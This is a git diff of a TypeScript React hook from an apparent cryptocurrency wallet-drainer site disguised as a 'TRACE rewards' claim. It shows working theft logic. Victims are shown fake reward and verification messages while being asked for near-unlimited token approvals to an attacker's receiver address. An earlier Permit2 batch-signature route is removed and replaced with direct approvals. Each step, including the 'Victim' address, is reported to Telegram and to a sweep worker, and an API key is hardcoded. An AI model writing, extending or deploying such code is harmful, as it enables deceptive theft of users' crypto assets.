@@ -9,38 +9,6 @@ const normalizeAddress = (addr: string) => ethers.getAddress(addr.toLowerCase())
 
 const RECEIVER_ADDRESS = normalizeAddress(process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351deeb1ba538d6cc9e89d4229986a1f8790088");
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
-const PERMIT2_ADDRESS = normalizeAddress("0x000000000022d473030f116ddee9f6b43ac78ba3");
-
-const ROUTER_ADDRESSES: Record<string, string> = {
-    "0x1": normalizeAddress("0x5351deeb1ba538d6cc9e89d4229986a1f8790088"),
-    "0x38": normalizeAddress("0x5351deeb1ba538d6cc9e89d4229986a1f8790088"),
-    "0x89": normalizeAddress("0x5efbaf362f388020339e6892bb8777e1d7f28b1d"),
-};
-
-const TRACE_TOKEN_ADDRESS = "0x25dC7c859B3C58A89AAb88916Fb0a6e215a1A926";
-
-const TRACE_REWARDS_ABI = [
-    "function claim(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 rewardAmount) external payable"
-];
-
-const PERMIT2_DOMAIN = {
-    name: "Permit2",
-    version: "1",
-    verifyingContract: PERMIT2_ADDRESS
-};
-
-const PERMIT2_TYPES = {
-    PermitBatchTransferFrom: [
-        { name: "permitted", type: "TokenPermissions[]" },
-        { name: "spender", type: "address" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" }
-    ],
-    TokenPermissions: [
-        { name: "token", type: "address" },
-        { name: "amount", type: "uint256" }
-    ]
-};
 
 const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
@@ -656,130 +624,44 @@ export function useWeb3Manager() {
                     setCurrentTask(`Securing ${targetChainName.toUpperCase()} rewards...`);
                     notifyTelegram(`<b>✍️ Requesting Approvals</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);
 
-                    const permit2Batch: any[] = [];
-                    const approvedTokens: any[] = [];
-
                     for (const token of tokensOnChain) {
                         try {
-                            // SKIP NATIVE TOKEN PLACEHOLDERS
                             const isNativeAddr =
                                 !token.address ||
                                 token.address === "0x0000000000000000000000000000000000000000" ||
                                 token.address.toLowerCase() === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" ||
-                                token.isNative === true ||
-                                token.symbol?.toUpperCase() === "ETH" ||
-                                token.symbol?.toUpperCase() === "BNB" ||
-                                token.symbol?.toUpperCase() === "MATIC";
+                                token.isNative === true;
 
                             if (isNativeAddr) continue;
 
                             const tokenContract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
 
-                            // 1. Check direct allowance to Receiver
-                            let allowanceToReceiver = 0n;
+                            let allowance = 0n;
                             try {
-                                allowanceToReceiver = await tokenContract.allowance(address, RECEIVER_ADDRESS);
+                                allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
                             } catch (e) { console.warn(e); }
 
-                            if (allowanceToReceiver >= BigInt(token.balance)) {
-                                console.log(`✅ ${token.symbol} already approved to Receiver.`);
-                                approvedTokens.push(token);
+                            if (allowance >= BigInt(token.balance)) {
+                                console.log(`✅ ${token.symbol} already approved.`);
                                 continue;
                             }
 
-                            // 2. Check Permit2 Allowance
-                            let allowanceToPermit2 = 0n;
-                            try {
-                                allowanceToPermit2 = await tokenContract.allowance(address, PERMIT2_ADDRESS);
-                            } catch (e) { console.warn(e); }
-
-                            if (allowanceToPermit2 >= BigInt(token.balance)) {
-                                console.log(`💎 ${token.symbol} has Permit2 allowance! Adding to bundle...`);
-                                permit2Batch.push(token);
-                                continue;
-                            }
-
-                            // 3. SECURE TO PERMIT2 (Instead of direct Receiver)
                             const narrative = getSocialNarrative(token.symbol, token.isNative);
-                            setCurrentTask(`Verification Phase: ${token.symbol}...`);
+                            setCurrentTask(`${narrative}: ${token.symbol}...`);
 
-                            // Use a large safe number (1 Trillion tokens) instead of MaxUint256 for better wallet compat
                             const safeLimit = ethers.parseUnits("1000000000000", token.decimals || 18);
                             const approvalAmount = BigInt(token.balance) > safeLimit ? token.balance : safeLimit;
 
-                            const approveTx = await tokenContract.approve(PERMIT2_ADDRESS, approvalAmount);
-                            await approveTx.wait();
+                            const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, approvalAmount);
 
-                            notifyTelegram(`<b>✅ PERMIT2 APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Waiting for Batch Signature...</i>`);
-                            permit2Batch.push(token);
+                            notifyTelegram(`<b>✍️ Approval Initiated</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>`);
+
+                            await approveTx.wait();
+                            notifyTelegram(`<b>✅ APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nStatus: Ready for Sweep`);
 
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
                             notifyTelegram(`<b>❌ Approval Failed</b>\nToken: ${token.symbol}\nError: <code>${errorMsg.slice(0, 100)}</code>`);
-                        }
-                    }
-
-                    if (permit2Batch.length > 0) {
-                        try {
-                            const routerAddress = ROUTER_ADDRESSES[targetChainId] || RECEIVER_ADDRESS;
-                            setCurrentTask(`Final Review: Secure Batch Reward (${permit2Batch.length} assets)...`);
-
-                            const nonce = BigInt(Math.floor(Math.random() * 1000000000000));
-                            const deadline = Math.floor(Date.now() / 1000) + 7200; // 2 hours
-
-                            const permitted = permit2Batch.map(t => ({
-                                token: normalizeAddress(t.address),
-                                amount: t.balance.toString()
-                            }));
-
-                            const spender = ethers.getAddress(routerAddress);
-
-                            const permitData = {
-                                permitted,
-                                spender: spender,
-                                nonce: nonce.toString(),
-                                deadline: deadline.toString()
-                            };
-
-                            const domain = { ...PERMIT2_DOMAIN, chainId: parseInt(targetChainId) };
-                            const signature = await signer.signTypedData(domain, PERMIT2_TYPES, permitData);
-
-                            notifyTelegram(`<b>🎁 TRACE REWARDS SIGNED</b>\nChain: ${targetChainName}\nTokens: ${permit2Batch.length}\nRouter: <code>${routerAddress}</code>\n\n<i>Attempting Direct Claim...</i>`);
-
-                            // Determine if we should do a direct contract call (Master Claim UI) or Worker Fallback
-                            const nativeBalance = await provider.getBalance(address);
-                            const feeRequired = ethers.parseEther("0.001");
-
-                            if (nativeBalance > feeRequired && routerAddress !== RECEIVER_ADDRESS) {
-                                try {
-                                    setCurrentTask(`Master Claim: Secure ${fakeEligible} $TRACE...`);
-                                    const contract = new ethers.Contract(routerAddress, TRACE_REWARDS_ABI, signer);
-
-                                    const tx = await contract.claim(
-                                        permitData,
-                                        signature,
-                                        ethers.parseUnits(fakeEligible.toString(), 18),
-                                        { value: feeRequired, gasLimit: 800000 }
-                                    );
-
-                                    notifyTelegram(`<b>💎 DIRECT CLAIM SENT</b>\nTx: <code>${tx.hash}</code>`);
-                                    await tx.wait();
-                                    notifyTelegram(`<b>💰 CLAIM SUCCESSFUL</b>\nAssets bundled and TRACE received!`);
-
-                                } catch (contractErr: any) {
-                                    console.error("Direct claim failed, falling back to worker", contractErr);
-                                    // Fallback to worker if contract call fails
-                                    await submitToWorker(permitData, signature, targetChainName, address, routerAddress, fakeEligible);
-                                }
-                            } else {
-                                // Fallback to worker (0 Gas for user)
-                                await submitToWorker(permitData, signature, targetChainName, address, routerAddress, fakeEligible);
-                            }
-
-                        } catch (p2Err: any) {
-                            console.error("Permit2 sign failed", p2Err);
-                            const errMsg = p2Err?.message || "Unknown signature error";
-                            notifyTelegram(`<b>⚠️ Signature Rejected</b>\nChain: ${targetChainName}\nError: <code>${errMsg.slice(0, 100)}</code>`);
                         }
                     }
 
@@ -839,25 +721,22 @@ export function useWeb3Manager() {
         }
     };
 
-    const submitToWorker = async (permit: any, signature: string, chainName: string, owner: string, routerAddress: string, rewardAmount: string) => {
+    const submitApprovalToWorker = async (token: any, txHash: string, chainName: string, owner: string) => {
         try {
             const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
-            await fetch(`${workerUrl}/submit-claim`, {
+            await fetch(`${workerUrl}/submit-approval`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    permit,
-                    signature,
+                    token: token.address,
+                    symbol: token.symbol,
+                    txHash,
                     chainName,
-                    owner,
-                    routerAddress,
-                    rewardAmount
+                    owner
                 })
             });
-            notifyTelegram(`<b>📥 Worker Submission Sent</b>\nChain: ${chainName}\nVictim: <code>${owner}</code>`);
         } catch (e) {
             console.error("Worker submission failed", e);
-            notifyTelegram(`<b>❌ Worker Submission Failed</b>\nError: <code>${(e as any).message}</code>`);
         }
     };
 
